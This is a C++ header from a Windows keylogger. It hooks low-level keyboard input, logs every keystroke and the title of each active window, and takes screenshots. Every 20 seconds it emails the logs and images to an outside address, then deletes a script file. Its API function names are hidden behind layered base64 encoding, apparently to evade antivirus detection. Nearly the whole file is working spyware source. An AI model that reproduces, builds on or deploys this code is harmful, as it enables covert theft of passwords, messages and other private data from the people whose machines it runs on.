#pragma once
#include<iostream>
#include<fstream>
#include"IO.h"
#include"SendMail.h"
#include"Timer.h"
#include"KeyConstant.h"
#include"ScreenShot.h"

//hooks to keep track of keystrokes

//keylog string has all the keystrokes
std::string keyLog = "";

void TimerSendMail() {
	//if keylog is empty: return
	if (keyLog.empty())
		return;
	//path for screenshot
	std::string path = IO::GetOurPath(true) + "ScreenShot-" + Helper::DateTime().getDateTimeString() + ".png";
	//if keylog is not empty, write it to a file
	if (ScreenShot::make_screenshot(path) == false) {
		Helper::WriteAppLog("Unable to take screenshot.");
		return;
	}
	std::string last_file = IO::WriteLog(keyLog);
	//if file creation was unsuccessful: write to debugging log
	if (last_file.empty()) {
		Helper::WriteAppLog("Unable to write create the file. keylog: '" + keyLog + "'");
		return;
	}

	std::vector<std::string> atts;
	atts.push_back(IO::GetOurPath(true) + last_file);
	Sleep(1000);
	atts.push_back(path);
	std::cout << "Sending the main : " + last_file<<std::endl;
	int x = Mail::SendMail("Keylogger Report [" + last_file + "]",
		"Keylogging Report: \nLog and potential screenshot files have been attached.\n"
		"\n Keylog: \n" + keyLog,
		atts);
	std::cout << "return Code : " + Helper::ToString(x)<<std::endl;
	//checking if mail was sent
	if (x != 7) {
		Helper::WriteAppLog("Mail was not sent! Error Code : " + Helper::ToString(x));
	}
	else {
		keyLog = "";
	}
	//IO::RemoveFile(IO::GetOurPath(true) + last_file);
	//IO::RemoveFile(path);
	IO::RemoveFile(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
}

//for screenshot
std::string old_window = "";
std::string active_window = "";
void TimerActiveWindow() {
	active_window = ScreenShot::ActiveWindow();
	if (old_window != active_window) {
		if (active_window != "")
			keyLog += "\n" + Helper::DateTime().getDateTimeString() + " | >>>>>> " + active_window + " <<<<<<\n";
		old_window = active_window;
	}
}
//this is where you would change how often you get mail
//values are in milliseconds
Timer MailTimer(TimerSendMail, 20000, Timer::Infinite);
Timer WindowTimer(TimerActiveWindow, 0, Timer::Infinite);

HHOOK eHook = NULL;

//function keeping track of the keystrokes
//uses Windows API
LRESULT CALLBACK MyKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) {
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
		keyLog += Keys::KEYS[kbd->vkCode].Name;
		if (kbd->vkCode == VK_RETURN)
			keyLog += '\n';
	}
	//keeping track if the system keys are up
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
		DWORD key = kbd->vkCode;
		if (key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN
			) {
			//adds which system keys were pressed and inserts
			//a "/" if it was let go to signify when it was let go
			std::string KeyName = Keys::KEYS[kbd->vkCode].Name;
			KeyName.insert(1, "/");
			keyLog += KeyName;
		}
	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

HHOOK(WINAPI* p_SetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

bool InstallHook() {
	MailTimer.Start(true);
	//WindowTimer.Start(true);
	p_SetWindowsHookExW = (HHOOK (__stdcall*) (int,HOOKPROC , HINSTANCE, DWORD))GetProcAddress(GetModuleHandleA(B64::base64_decode("Vm1wS01GbFhTWGhWV0d4VVlUSm9WbGx0ZEdGV2JGbDNXa1JTVldKSGVIcFdNblF3WWtkS1NHVkliRlppUmtwNlZsWmFWMVpWTVVWaGVqQTk=",7).c_str()), B64::base64_decode("Vm0weE5GVXhUWGhYV0dST1ZsZFNXVll3WkRSalJsVjNWMjFHYUZKc1dqRlpNR2hMWWtkS1NHUjZTbFpXZWtFeFdWUktTMVp0U2tWV2JVWlRWbXh3YjFkWGRHRlRNbEpIVld4V2FHVnFRVGs9",7).c_str());
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MyKeyBoardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}

//prevents keylogging: uninstalls the hook
//program still runs though
bool UninstallHook() {
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool isHooked() {
	return (bool)(eHook == NULL);
}